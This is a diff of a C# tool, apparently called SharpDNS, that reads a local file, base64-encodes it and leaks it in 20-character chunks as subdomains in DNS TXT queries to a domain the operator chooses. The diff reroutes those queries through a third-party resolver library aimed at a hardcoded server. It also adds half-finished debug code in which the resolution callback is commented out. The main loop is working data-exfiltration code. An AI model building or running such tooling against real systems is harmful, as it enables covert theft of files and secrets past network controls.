@@ -1,4 +1,5 @@
-﻿using System;
+﻿using DnsDig;
+using System;
 using System.Collections;
 using System.Collections.Generic;
 using System.ComponentModel;
@@ -14,9 +15,111 @@ namespace SharpDNS
     class Program
     {
 
+        // DEBUG CODE
+        public static async void RunTest()
+        {
+            await Resolve("asdfasdfasdfasdfasdfa.ca", 0);
+            await Resolve("google.com", 0);
+        }
+
+        public static async void RunAsyncDNS(string domain)
+        {
+            await Resolve(domain, 0);
+        }
+
+        public static Task<IPHostEntry> GetHostEntryAsync(string hostNameOrAddress)
+        {
+            return Task<IPHostEntry>.Factory.FromAsync<string>(new Func<string, AsyncCallback, object, IAsyncResult>(Dns.BeginGetHostEntry), new Func<IAsyncResult, IPHostEntry>(Dns.EndGetHostEntry), hostNameOrAddress, null);
+        }
+
+        public static Task<bool> Resolve(string hostNameOrAddress, int millisecond_time_out)
+        {
+            return Task.Run(async () =>
+            {
+                bool completed = false;
+                var asCallBack = new AsyncCallback(ar =>
+                {
+                    ResolveState context = (ResolveState)ar.AsyncState;
+                    /*
+                    if (context.Result == ResolveType.Pending)
+                    {
+                        try
+                        {
+                            var ipList = Dns.EndGetHostEntry(ar);
+                            if (ipList == null || ipList.AddressList == null || ipList.AddressList.Length == 0)
+                                context.Result = ResolveType.InvalidHost;
+                            else
+                                context.Result = ResolveType.Completed;
+                        }
+                        catch
+                        {
+                            context.Result = ResolveType.InvalidHost;
+                        }
+                    }
+                    completed = true;
+                    */
+                });
+                ResolveState ioContext = new ResolveState(hostNameOrAddress);
+                var result = Dns.BeginGetHostEntry(ioContext.HostName, asCallBack, ioContext);
+                /*
+                int miliCount = 0;
+                while (!completed)
+                {
+                    miliCount++;
+                    if (miliCount >= millisecond_time_out)
+                    {
+                        result.AsyncWaitHandle.Close();
+                        result = null;
+                        ioContext.Result = ResolveType.Timeout;
+                        break;
+                    }
+                    await Task.Delay(1);
+                }
+                Console.WriteLine($"The result of Resolve for {ioContext.HostName} is {ioContext.Result}");
+                */
+                result.AsyncWaitHandle.Close();
+                result = null;
+                return ioContext.Result == ResolveType.Completed;
+            });
+        }
+
+        public class ResolveState
+        {
+            public ResolveState(string hostName)
+            {
+                if (string.IsNullOrWhiteSpace(hostName))
+                    throw new ArgumentNullException(nameof(hostName));
+                _hostName = hostName;
+            }
+
+            readonly string _hostName;
+
+            public ResolveType Result { get; set; } = ResolveType.Pending;
+
+            public string HostName => _hostName;
+
+        }
+
+        public enum ResolveType
+        {
+            Pending,
+            Completed,
+            InvalidHost,
+            Timeout
+        }
+
+        // ORIGINAL CODE BELOW
+
         static string usage = "file:C:\\myFile.txt domain:yourdomain.com";
         static void Main(string[] args)
         {
+
+            // DEBUG CODE
+            //RunTest();
+
+            // ORIGINAL CODE BELOW
+
+
             var arguments = new Dictionary<string, string>();
             try
             {
@@ -53,6 +156,7 @@ namespace SharpDNS
             Byte[] bytes = File.ReadAllBytes(arguments["file"]);
             String file = Convert.ToBase64String(bytes);
 
+            /*
             IPHostEntry hostEntry;
 
             hostEntry = Dns.GetHostEntry(arguments["domain"]);
@@ -68,7 +172,7 @@ namespace SharpDNS
             {
                 Console.WriteLine("Can't resolve TLD, exiting");
                 Environment.Exit(1);
-            }
+            }*/
 
 
             for (int i = 0; i < file.Length - 20; i += 20)
@@ -76,18 +180,27 @@ namespace SharpDNS
                 string reply = String.Empty;
                 try
                 {
-                    //debug
-                    string request = file.Substring(i,20);
+                    Dig myDig = new Dig();
+
+
+                    //string name = "asdf.goasdfogle.com";
+                    myDig.resolver.DnsServer = "192.168.5.5";
+
+                    System.Net.IPEndPoint ipEndPoint = new System.Net.IPEndPoint((long)(uint)System.Net.IPAddress.NetworkToHostOrder(
+                     (int)System.Net.IPAddress.Parse("5.5.168.192").Address), 53);
+
+
+
+                    myDig.resolver.DnsServers = new[] { ipEndPoint };
+                    myDig.resolver.Recursion = false;
+                    myDig.resolver.Retries = 1;
+                    myDig.resolver.TimeOut = 0;
+                    myDig.resolver.TransportType = Heijden.DNS.TransportType.Udp;
+                    myDig.resolver.UseCache = false;
+                    string request = file.Substring(i, 20);
                     request += "." + arguments["domain"];
-                    
 
-                    DnsResolver.GetTXTRecord(request, ip.ToString());
-
-                    //if (reply != "OK")
-                    //{
-                    //    Console.WriteLine(String.Format("[!] Unexpected answer for request: [{0}]", reply[0]));
-                    //    return;
-                    //}
+                    myDig.resolver.Query(request, Heijden.DNS.QType.TXT, Heijden.DNS.QClass.IN);
                 }
                 catch (Win32Exception e)
                 {
@@ -96,6 +209,7 @@ namespace SharpDNS
                 }
             }
 
+            Console.ReadLine();
 
         }
     }
